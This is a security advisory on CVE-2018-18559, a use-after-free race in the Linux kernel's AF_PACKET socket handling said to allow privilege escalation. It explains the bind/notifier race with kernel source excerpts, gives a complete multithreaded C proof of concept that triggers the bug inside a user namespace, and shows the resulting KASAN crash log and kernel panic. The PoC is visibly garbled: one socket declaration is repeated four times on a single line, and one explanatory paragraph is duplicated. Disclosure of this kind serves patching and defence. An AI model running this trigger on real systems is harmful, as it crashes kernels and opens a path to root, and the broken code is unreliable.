**Vulnerability Summary**<br>
UAF vulnerability in Linux Kernel’s implementation of AF_PACKET leads to privilege escalation. AF_PACKET sockets allow users to send or receive packets on the device driver level, which lets them implement their own protocol on top of the physical layer or sniffing packets including Ethernet and higher levels protocol and higher levels of the OSI model.

**CVE**<br>
CVE-2018-18559

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Ubuntu Desktop versions 14.04, 16.04, 17.10, and other Linux distributions with older kernel versions. The vulnerability has been resolved in the latest Linux Kernel version 4.17.11.

**Vulnerability Details**<br>
A use-after-free can occur due to a race condition between fanout_add from setsockopt and bind on a AF_PACKET socket.
Although the racing condition has been fixed here: 15fe076edea787807a7cdc168df832544b58eba6#diff-39c49c27f7a70091bcf94cbad241d0eb. They failed to see a UAF could occur from the racing issue. The logic is that a packet_sock can be linked via its prot_hook member to one of the ptype_head linked list in /net/core/dev.c. Each list is a list of function callbacks the Linux stack can call when a network packet is received or sent.
The logic is that a packet_sock can be linked via its prot_hook member to one of the ptype_head linked list in /net/core/dev.c. Each list is a list of function callbacks the Linux stack can call when a network packet is received or sent, as discussed in the first advisory about AF_PACKET (https://blogs.securiteam.com/index.php/archives/3484)

```c
static inline struct list_head *ptype_head(const struct packet_type *pt)
{
	if (pt->type == htons(ETH_P_ALL))
		return pt->dev ? &pt->dev->ptype_all : &ptype_all;
	else
		return pt->dev ? &pt->dev->ptype_specific :
				 &ptype_base[ntohs(pt->type) & PTYPE_HASH_MASK];
}
void dev_add_pack(struct packet_type *pt)
{
	struct list_head *head = ptype_head(pt);
	spin_lock(&ptype_lock);
	list_add_rcu(&pt->list, head);
	spin_unlock(&ptype_lock);
}
```

register_prot_hook() and __unregister_prot_hook() in /net/packet/af_packet.c can both be reached via packet_do_bind() and packet_notifier() without any locks held. Which ptype_head list it is added to only depends on po->num. When a thread A unregisters it from packet_do_bind(), a second thread B can rapidly call packet_notifier() to register it again on the same list, before thread A continues with `po->num = proto`:

```c
static int packet_do_bind(struct sock *sk, const char *name, int ifindex,
			  __be16 proto)
{
	...
	if (need_rehook) {
		if (po->running) {
			rcu_read_unlock();
			__unregister_prot_hook(sk, true);
	...
	po->num = proto;
	po->prot_hook.type = proto;
	...
	if (!unlisted && (!dev || (dev->flags & IFF_UP))) {
			register_prot_hook(sk);
	...
}
```
which will add it into a new list. When releasing the socket in packet_release, we will release the one from the last linked list but forget that we have another one in the first original list from packet_create(), thus causing a UAF.
We can get PC control by following the same logic as in the previously mentioned SSD article.

**PoC**<br>
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}
void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();
	if (unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("sched_setaffinity()");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ip link set dev lo up") != 0) {
		perror("system(/sbin/ip link set dev lo up)");
		exit(EXIT_FAILURE);
	}
	printf("[.] namespace sandbox setup successfully\n");
}
void *trigger(void *unused)
{
	struct ifreq ifreq;
	struct sockaddr_ll addr1, addr2;
	int index;
	int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);
	memcpy(&ifreq.ifr_name, "lo", 3);
	ioctl(fd, SIOCSIFFLAGS, &ifreq);
	ifreq.ifr_flags = IFF_UP;
	ioctl(fd, SIOCSIFFLAGS, &ifreq);
	ioctl(fd, SIOCGIFINDEX, &ifreq);
	index = ifreq.ifr_ifindex;
	addr1.sll_family = AF_PACKET;
	addr1.sll_ifindex = index;
	bind(fd, (struct sockaddr *)&addr1, sizeof(addr1));
	addr2.sll_family = AF_PACKET;
	bind(fd, (struct sockaddr *)&addr2, sizeof(addr2));
	close(fd);
}
#define NB_T 20
int main()
{
	int i;
	setup_sandbox();
	do {
		pthread_t trigger_tasks[NB_T];
		for (i = 0; i < NB_T; ++i)
			pthread_create(&trigger_tasks[i], NULL, trigger, NULL);
		for (i = 0; i < NB_T; ++i)
			pthread_join(trigger_tasks[i], NULL);
	} while (1);
	return 0;
}
```

**Crash Info**<br>
Crash info
```assembly
[  123.793289] BUG: KASAN: use-after-free in dev_add_pack+0x240/0x2d0
[  123.793858] Write of size 8 at addr ffff88005c67f3b0 by task poc/225
[  123.794414]
[  123.794609] CPU: 0 PID: 225 Comm: poc Not tainted 4.13.13+ #3
[  123.795111] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  123.795876] Call Trace:
[  123.796099]  dump_stack+0xb8/0x152
[  123.797103]  print_address_description+0x6f/0x270
[  123.797560]  kasan_report+0x275/0x360
[  123.798327]  __asan_report_store8_noabort+0x1c/0x20
[  123.798828]  dev_add_pack+0x240/0x2d0
[  123.800005]  register_prot_hook.part.50+0x81/0xa0
[  123.800464]  packet_do_bind+0x52e/0xda0
[  123.802584]  packet_bind+0x117/0x190
[  123.803035]  SYSC_bind+0x1bd/0x490
[  123.818401]  SyS_bind+0xe/0x10
[  123.818762]  entry_SYSCALL_64_fastpath+0x24/0xab
[  123.819299] RIP: 0033:0x450a67
[  123.819658] RSP: 002b:00007fa6e7976d28 EFLAGS: 00000217 ORIG_RAX: 0000000000000031
[  123.820571] RAX: ffffffffffffffda RBX: 00007fa6e7977700 RCX: 0000000000450a67
[  123.821414] RDX: 0000000000000014 RSI: 00007fa6e7976d50 RDI: 0000000000000014
[  123.822258] RBP: 00007ffd83198af0 R08: 00007fa6e7977700 R09: 00007fa6e7977700
[  123.823108] R10: 00007fa6e79779d0 R11: 0000000000000217 R12: 00007ffd83198aee
[  123.823953] R13: 00007ffd83198aef R14: 00007fa6e7977700 R15: 000000000000000f
[  123.824811]
[  123.824996] Allocated by task 234:
[  123.825407]  save_stack_trace+0x1b/0x20
[  123.825875]  save_stack+0x43/0xd0
[  123.826203]  kasan_kmalloc+0xad/0xe0
[  123.826542]  __kmalloc+0x105/0x230
[  123.826952]  sk_prot_alloc+0xe2/0x260
[  123.827390]  sk_alloc+0x110/0xeb0
[  123.827822]  packet_create+0x160/0xb80
[  123.828309]  __sock_create+0x2c3/0x6b0
[  123.828806]  SyS_socket+0xe3/0x220
[  123.829219]  entry_SYSCALL_64_fastpath+0x24/0xab
[  123.829773]
[  123.829960] Freed by task 234:
[  123.830333]  save_stack_trace+0x1b/0x20
[  123.830838]  save_stack+0x43/0xd0
[  123.831284]  kasan_slab_free+0x72/0xc0
[  123.831779]  kfree+0x94/0x1a0
[  123.832181]  __sk_destruct+0x594/0x820
[  123.832711]  sk_destruct+0x3f/0x60
[  123.833170]  __sk_free+0x54/0x200
[  123.833618]  sk_free+0x19/0x20
[  123.834031]  packet_release+0x79b/0xd00
[  123.834539]  sock_release+0x8d/0x1c0
[  123.834976]  sock_close+0x12/0x20
[  123.835436]  __fput+0x309/0x910
[  123.835874]  ____fput+0xe/0x10
[  123.836353]  task_work_run+0x153/0x230
[  123.836919]  exit_to_usermode_loop+0x1e6/0x230
[  123.837475]  syscall_return_slowpath+0x270/0x300
[  123.838107]  entry_SYSCALL_64_fastpath+0xa9/0xab
[  123.838702]
[  123.838908] The buggy address belongs to the object at ffff88005c67ee80
[  123.838908]  which belongs to the cache kmalloc-2048 of size 2048
[  123.840392] The buggy address is located 1328 bytes inside of
[  123.840392]  2048-byte region [ffff88005c67ee80, ffff88005c67f680)
[  123.841377] The buggy address belongs to the page:
[  123.841783] page:ffffea0001719e00 count:1 mapcount:0 mapping:          (null) index:0x0 compound_mapcount: 0
[  123.842832] flags: 0xfffffc0008100(slab|head)
[  123.843292] raw: 000fffffc0008100 0000000000000000 0000000000000000 00000001000f000f
[  123.843979] raw: dead000000000100 dead000000000200 ffff880060802a80 0000000000000000
[  123.844758] page dumped because: kasan: bad access detected
[  123.845313]
[  123.845469] Memory state around the buggy address:
[  123.845948]  ffff88005c67f280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  123.846663]  ffff88005c67f300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  123.847362] >ffff88005c67f380: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  123.848078]                                      ^
[  123.848561]  ffff88005c67f400: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  123.849275]  ffff88005c67f480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  123.849988] ==================================================================
[  123.850701] Disabling lock debugging due to kernel taint
[  123.851280] Kernel panic - not syncing: panic_on_warn set ...
[  123.851280]
[  123.852134] CPU: 0 PID: 225 Comm: poc Tainted: G    B           4.13.13+ #3
[  123.852974] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  123.854044] Call Trace:
[  123.854352]  dump_stack+0xb8/0x152
[  123.857454]  panic+0x199/0x329
[  123.858279]  kasan_end_report+0x43/0x50
[  123.858742]  kasan_report+0x16c/0x360
[  123.859695]  __asan_report_store8_noabort+0x1c/0x20
[  123.860313]  dev_add_pack+0x240/0x2d0
[  123.861305]  register_prot_hook.part.50+0x81/0xa0
[  123.861688]  packet_do_bind+0x52e/0xda0
[  123.863094]  packet_bind+0x117/0x190
[  123.863433]  SYSC_bind+0x1bd/0x490
[  123.874596]  SyS_bind+0xe/0x10
[  123.874858]  entry_SYSCALL_64_fastpath+0x24/0xab
[  123.875242] RIP: 0033:0x450a67
[  123.875500] RSP: 002b:00007fa6e7976d28 EFLAGS: 00000217 ORIG_RAX: 0000000000000031
[  123.876209] RAX: ffffffffffffffda RBX: 00007fa6e7977700 RCX: 0000000000450a67
[  123.876985] RDX: 0000000000000014 RSI: 00007fa6e7976d50 RDI: 0000000000000014
[  123.877819] RBP: 00007ffd83198af0 R08: 00007fa6e7977700 R09: 00007fa6e7977700
[  123.878695] R10: 00007fa6e79779d0 R11: 0000000000000217 R12: 00007ffd83198aee
[  123.879546] R13: 00007ffd83198aef R14: 00007fa6e7977700 R15: 000000000000000f
[  123.880562] Kernel Offset: 0x32a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[  123.881832] Rebooting in 1 seconds..
```
